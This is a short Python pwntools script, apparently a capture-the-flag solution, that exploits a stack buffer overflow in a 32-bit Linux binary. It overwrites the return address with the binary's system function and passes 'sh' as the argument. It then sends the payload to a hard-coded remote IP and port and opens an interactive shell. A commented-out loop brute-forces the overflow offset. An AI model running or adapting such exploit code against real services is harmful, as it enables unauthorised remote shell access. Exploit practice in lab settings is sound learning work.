from pwn import *
context.update(arch='i386', os='linux'
)
# -fno-stack-protector
FILENAME = 'gdc_evidence_01'

e = ELF(FILENAME)
print(e.symbols)
system=(e.symbols['system'])
print(hex(system))

def get_process():
    #return process(FILENAME)
    return remote('13.213.195.207',60120)

#ropchain += p32(0x0804921a)

#ropchain += p32(0x08049022)# pop ebx
#ropchain += p32(0x08049321) pop ...
#for i in range(3):

ebx = b'sh  '

esp = p32(system)
ebp = p32(system)

ropchain = esp + ebx + ebp
payload = b'A'*68+ropchain
with open('payload','wb') as f: f.write(payload)

'''
## Bruteforce length #####################
# 68 crashes, so 67, by manual bruteforcing
for i in range(11,100):
    payload = cyclic(i)
    io = get_process()
    io.recv()
    io.sendline(payload)
    #io.sendline('')
    io.wait()
    data = io.recv()
    print(data)
    if b'Try again' in data:
        pass#print(i)
        #break
    else:
        print(i)
        input()
    io.close()
'''

io = get_process()
io.sendline(payload)
io.interactive()
io.close()
